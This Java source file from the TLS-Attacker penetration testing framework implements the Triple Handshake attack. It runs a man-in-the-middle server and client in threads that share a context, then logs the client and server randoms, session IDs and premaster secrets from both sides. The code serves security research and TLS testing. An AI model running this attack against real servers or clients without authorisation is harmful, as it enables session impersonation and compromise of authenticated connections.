/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeAttackWorflowThread;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.attacks.config.TripleHandshakeAttackCommandConfig;
import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeSharedContext;
import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeWorkflowExecutor;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.config.ConfigHandlerFactory;
import de.rub.nds.tlsattacker.tls.config.GeneralConfig;
import de.rub.nds.tlsattacker.tls.config.ServerCommandConfig;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.ArrayConverter;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes the Triple Handshake attack against a target server using a client
 * with legitimate cert.
 * 
 * @author Philip Riese <philip.riese@rub.de>
 */
public class TripleHandshakeAttack extends Attacker<TripleHandshakeAttackCommandConfig> {

    public static Logger LOGGER = LogManager.getLogger(TripleHandshakeAttack.class);

    public TripleHandshakeAttack(TripleHandshakeAttackCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler clientConfigHandler) {
	ServerCommandConfig serverCommandConfig = new ServerCommandConfig();
	serverCommandConfig.setPort(config.getPort());
	serverCommandConfig.setCipherSuites(config.getCipherSuites());
	serverCommandConfig.setKeystore(config.getKeystore());
	serverCommandConfig.setPassword(config.getPassword());
	serverCommandConfig.setAlias(config.getAlias());
	serverCommandConfig.setWorkflowTraceType(config.getWorkflowTraceType());
	if (config.isClientAuthentication()) {
	    serverCommandConfig.setClientAuthentication(true);
	}

	TripleHandshakeSharedContext sharedContext = new TripleHandshakeSharedContext();

	GeneralConfig generalConfig = new GeneralConfig();
	ConfigHandler serverConfigHandler = ConfigHandlerFactory.createConfigHandler("server");
	serverConfigHandler.initializeGeneralConfig(generalConfig);
	TransportHandler serverTransportHandler = serverConfigHandler.initializeTransportHandler(serverCommandConfig);
	TlsContext serverTlsContext = serverConfigHandler.initializeTlsContext(serverCommandConfig);
	TripleHandshakeWorkflowExecutor serverWorkflowExecutor = new TripleHandshakeWorkflowExecutor(
		serverTransportHandler, serverTlsContext, sharedContext);

	TransportHandler clientTransportHandler = clientConfigHandler.initializeTransportHandler(config);
	TlsContext clientTlsContext = clientConfigHandler.initializeTlsContext(config);
	TripleHandshakeWorkflowExecutor clientWorkflowExecutor = new TripleHandshakeWorkflowExecutor(
		clientTransportHandler, clientTlsContext, sharedContext);

	Thread server = new Thread(new TripleHandshakeAttackWorflowThread(serverWorkflowExecutor,
		serverTransportHandler));
	server.start();

	Thread client = new Thread(new TripleHandshakeAttackWorflowThread(clientWorkflowExecutor,
		clientTransportHandler));
	client.start();

	while (client.isAlive()) {

	}
	LOGGER.debug("ClientRandom Server: {}", ArrayConverter.bytesToHexString(serverTlsContext.getClientRandom()));
	LOGGER.debug("ClientRandom Client: {}", ArrayConverter.bytesToHexString(clientTlsContext.getClientRandom()));
	LOGGER.debug("ServerRandom Server: {}", ArrayConverter.bytesToHexString(serverTlsContext.getServerRandom()));
	LOGGER.debug("ServerRandom Client: {}", ArrayConverter.bytesToHexString(clientTlsContext.getServerRandom()));
	LOGGER.debug("SessionID Server: {}", ArrayConverter.bytesToHexString(serverTlsContext.getSessionID()));
	LOGGER.debug("SessionID Client: {}", ArrayConverter.bytesToHexString(clientTlsContext.getSessionID()));
	LOGGER.debug("PreMasterSecret Server: {}",
		ArrayConverter.bytesToHexString(serverTlsContext.getPreMasterSecret()));
	LOGGER.debug("PreMasterSecret Client: {}",
		ArrayConverter.bytesToHexString(clientTlsContext.getPreMasterSecret()));
    }

}
